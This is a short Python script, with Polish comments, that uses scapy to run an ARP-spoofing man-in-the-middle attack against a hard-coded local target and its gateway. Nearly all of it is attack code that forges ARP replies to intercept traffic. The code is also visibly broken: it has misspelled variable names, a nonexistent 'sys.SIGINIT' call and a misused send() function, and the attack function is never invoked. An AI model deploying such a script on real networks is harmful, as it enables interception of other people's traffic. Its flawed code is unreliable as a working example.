from scapy.all import *
from time import sleep
import os
import sys

INTERFACE = 'eth0'
TARGER_IP = '172.26.1.11'
GATEWAY_IP = '172.26.1.1'
conut = 1000

conf.iface = INTERFACE

#---------------Funckje-----------------
def get_mac(ip):
    ans, _ = send(Ether(dst="FF:FF:FF:FF:FF:FF")/ARP(pdst=ip), retry=2, count=10)
    for send, responsed in ans:
        return responsed[Ether].src

def poison_attack(gateway_ip, gateway_mac, target_ip, target_mac):
    poison_target = ARP()
    poison_target.op = 2
    poison_target.psrc = gateway_ip
    posion_target.pdst = target_ip
    posion_target.hwdst = target_mac

    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst = gateway_mac

    while True:
        try:
            send(poison_target)
            send(poison_gateway)
            sleep(2)
            print(f"*** UDANY ATACK NA {target_ip} oraz brame {gateway_ip} ***")

        except KeyboardInterrupt:
            restore_defaults(gateway_ip, gateway_mac, target_ip, target_mac)
    print("Atack zakoczony")
    


def restore_defaults(gateway_ip, gateway_mac, target_ip, target_mac):
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst="FF:FF:FF:FF:FF:FF", hwsrc=gateway_mac), count=5)
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst="FF:FF:FF:FF:FF:FF", hwsrc=target_mac), count=5)

    os.kill(os.getpid(), sys.SIGINIT)

TARGET_MAC = get_mac(TARGER_IP)
GATEWAY_MAC = get_mac(GATEWAY_IP)

